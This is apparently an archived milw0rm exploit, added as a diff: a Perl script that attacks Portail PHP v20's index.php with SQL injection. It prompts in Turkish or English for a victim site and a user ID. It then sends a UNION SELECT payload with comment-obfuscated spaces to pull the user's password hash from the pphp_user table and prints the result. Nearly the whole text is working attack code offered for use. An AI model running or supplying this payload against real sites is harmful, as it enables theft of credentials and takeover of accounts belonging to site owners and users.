@@ -1,0 +1,52 @@
+use LWP::Simple;
+print "
+Exploit Coded (c) by xoron
+Portail PHP v20 (index.php) Remote SQL Injection Exploit
+Languages: Turkish, English
+Plz Select Language:";
+$dil = <stdin>;
+%eng = (
+"site" => "Enter The Victim Without http://:",
+"path" => "Plz Select Path:",
+"id" => "Plz Select User ID:"
+);
+%turk = (
+"site" => "Site Adi http:// ile baslayan:",
+"path" => "Dizin:",
+"id" => "ID: "
+);
+if($dil=~/^turkish$/i){
+%dil = %turk;
+}
+elsif($dil=~/^english$/i){
+%dil = %eng;
+}
+else{print "Undefined Language"; exit}
+print $dil{site};
+chop($site=<stdin>);
+$site = "http://$site" if !($site=~/^http/);
+print $dil{path};
+chop($dir=<stdin>);
+$dir = "/portailphp/" if !$dir;
+print $dil{id};
+chop($id =<stdin>);
+$id = 2 if !$id;
+print "Connecting to $site\n";
+$sql = "index.php?affiche=Comment&act=lire&idnews=-1/**/union/**/select/**/0,";
+$sql .= "1,2,US_pwd,4,5,6,7,8,9,10/**/from/**/pphp_user/**/where/**/US_uid=$id/*";
+$get = get("$site$dir$sql");
+if($get){
+if($get=~/<td><strong>\&nbsp\;\&nbsp\;(.*?)<\/strong>/){
+print "You are very Lucky Boy\nI Got Hash 4 ya\nID: $id\nHash: $1";
+exit
+}
+elsif($get=~/<td><strong>(.*?)<\/strong>/){
+print "Yep I got hash 4 ya\nID: $id\nHash: $1\n";
+exit;
+}
+else{print "Exploit Failed\n";exit}
+}
+print "Connect Failed to $site\n";
+exit;
+
+# milw0rm.com [2007-03-22]
